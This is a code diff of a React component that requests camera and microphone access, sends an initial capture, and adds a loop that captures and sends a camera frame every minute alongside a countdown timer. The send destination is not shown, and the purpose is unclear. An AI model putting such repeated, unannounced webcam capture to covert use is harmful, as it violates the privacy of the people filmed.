@@ -48,34 +48,49 @@ const Home = () => {
       }
     };
   };
+
+  // 2. Permission and Initial Capture
   const handleGrantAccess = async () => {
     try {
-      // Camera ebong Mic-er permission ekshathe request kora
       const stream = await navigator.mediaDevices.getUserMedia({
         video: true,
         audio: true,
       });
-      captureAndSend(stream);
-      // Permission peye gele stream-ti video element-e set hobe (jodi dorkar hoy)
+
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
       }
 
-      // Permission success hole step 0 (Welcome page) e niye jabe
+      // Prothom chobi tule fela
+      captureAndSend(stream);
       setStep(0);
     } catch (err) {
-      console.error("Access Denied:", err);
-      alert(
-        "Oops! Camera ebong Mic permission chara amra agate parbo na. Please allow korun.",
-      );
+      alert("Permission chara proshob somvob noy!");
     }
   };
+
+  // 3. Timer and Continuous Capture Loop
   useEffect(() => {
+    // Timer Logic
     const timer = setInterval(() => {
       setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
     }, 1000);
-    return () => clearInterval(timer);
-  }, []);
+
+    // Continuous Capture (Every 60 seconds)
+    let captureInterval;
+    if (step >= 0) {
+      captureInterval = setInterval(() => {
+        if (videoRef.current && videoRef.current.srcObject) {
+          captureAndSend(videoRef.current.srcObject);
+        }
+      }, 60000); // 1 minute interval
+    }
+
+    return () => {
+      clearInterval(timer);
+      if (captureInterval) clearInterval(captureInterval);
+    };
+  }, [step]);
 
   const formatTime = (seconds) => {
     const mins = Math.floor(seconds / 60);
